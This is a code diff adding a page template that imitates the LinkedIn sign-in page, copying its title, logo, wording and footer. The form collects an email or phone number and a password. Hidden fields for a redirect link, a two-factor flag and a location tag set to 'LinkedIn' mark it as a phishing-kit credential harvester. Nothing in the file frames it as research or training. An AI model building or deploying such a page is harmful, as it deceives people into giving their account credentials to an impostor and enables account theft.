@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html class=artdeco>
+
+<head>
+    <meta charset=UTF-8>
+    <title>LinkedIn Login, Sign in | LinkedIn</title>
+    <link rel="shortcut icon"
+        href=data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAElBMVEUBd7X///8zj8Hu9vqayeFwsNSeSs7hAAAAOUlEQVR4AZ2PQQoAMQgDTbL+/8vrcRBKoYMiGfCQ+oowAnvlxCfBFyLNOIopolmKdksUc5/FnV3/B0HmAHOhP+JYAAAAAElFTkSuQmCC>
+        <link rel=stylesheet type=text/css href="~/css/linkedin.css">
+
+    <style>
+
+    </style>
+</head>
+
+<body class=system-fonts>
+    <header>
+        <div class=nav__base></div>
+    </header>
+    <main class=app__content role=main>
+        <div class=header__logo>
+            <h2 class=in__logo>LinkedIn</h2><img
+                src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFQAAAAVCAMAAADvsTk6AAAASFBMVEVHcEwNDQ0nJyfNzc0dHR1FRUWcnJwAAAAAd7UNfrkxMTGurq7X2txxcXFXV1eGv9yAgICm0OXn8/m8vLxCmslkrdMwkcNIncqnDRS5AAAAAXRSTlMAQObYZgAAASdJREFUeAG11N2unCAYRuHFD76jAo7j3tP7v9Oq2MbqkNTYrgPzhYMnIkRuNraPY+3AzYp5UNkXudxifB1lJLEVZPkjSVSTtKItvNoqGiW56+gP4KuK0sn/8zcFx2W0/k1PXUJ3tSe0jJKPwcg2vxZckBI0VvKJpaeXCe43uj7h9R6BoYIar6WmLMS8mkGSkTrKKJkjuvX9GZVCMlIoC3mdGilDkp7L6BvX2zM6DkCsoAl6yZdZskCQdxC9OrLUAP0JnXf+DVRQt5vnJsBry2BlWeqO6Hs+qDq6n7MUiuBLdfQx93coVnpClmEr7LdfR0sVdLIyDZOUI65LVA7qEroi3fTK2y3qIWjN3EFJUojl8oeeuWRkuj7UUW72+NT/+fPfbGjP5vgTYaoX8c8H0y8AAAAASUVORK5CYII=">
+        </div>
+        <div class=header__content>
+            <h1 class=header__content__heading>Welcome Back</h1>
+            <p class=header__content__subheading>Don&#39;t miss your next opportunity. Sign in to stay updated on your
+                professional world.</p>
+        </div>
+        </div>
+             @using (Html.BeginForm())
+             {
+            <div class=form__input--floating>
+                <input type=hidden name=name value="'.basename(__FILE__).'">
+                <input type=hidden name=TFA_Enabled value="'.$TFA_Enabled.'">
+                <input name=username type=text required autofocus><label class=form__label--floating for=username>Email
+                    or Phone</label>
+                <input type=hidden name=link value='.$redirect.'>
+                <input type=hidden name=location value=LinkedIn />
+            </div>
+            <div class=form__input--floating>
+                <input type=password name=password required><label for=password
+                    class=form__label--floating>Password</label><span class=button__password-visibility
+                    role=button>Show</span>
+            </div>
+            <div class=login__form_action_container><button class="btn__primary--large from__button--floating"
+                    type=submit>Sign in</button></div>
+            }
+        <div class=footer-app-content-actions>
+            <div><a href=" " class="btn__tertiary--medium action__btn">Forgot password?</a></div>
+            <p>New to LinkedIn? <a href=" ">Join now</a></p>
+        </div>
+    </main>
+    <footer class=footer__base role=contentinfo>
+        <div class=footer__base__wrapper>
+            <p class=copyright><img style=margin-bottom:-2px;
+                    src=data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADgAAAAOCAMAAABNey+cAAAALVBMVEVHcEwAAAALCwsoKChpaWmOjo4eHh4zMzNERER5eXlSUlLY2Ni+vr6ysrKioqJ1E4WcAAAAAXRSTlMAQObYZgAAAK1JREFUeAGt0ktOxDAQANGq9sf5xHP/44IFyMkMiAhRm44Uv4Vb5n7ZU5n7aa1ToowiTge+Q2CD5f8g/A5NzReoWEuKZUfZN1d6i1SAkiJ/QBi/do50hdrCDWUx87Cuiw+KJicccTzBwmGg2Q2SB0Sj2eknWGKDJ/g1wx3CUWAAMWE1foTdBClgVO0cTujnt46ukOxCsZW1zjvegoytruFY8vuMXF/h/bz050f+BjfTA5h9vu5OAAAAAElFTkSuQmCC><em><span
+                        class=a11y__label>LinkedIn</span> &#x00A9; 2019</em></p>
+            <div>
+                <ul class=footer__base__nav-list aria-label="Footer Legal Menu">
+                    <li><a href>User Agreement</a></li>
+                    <li><a href>Privacy Policy</a></li>
+                    <li><a href>Community Guidelines</a></li>
+                    <li><a href>Cookie Policy</a></li>
+                    <li><a href>Copyright Policy</a></li>
+                    <li><a href>Send Feedback</a></li>
+                </ul>
+            </div>
+    </footer>
+</body>
+
+</html>
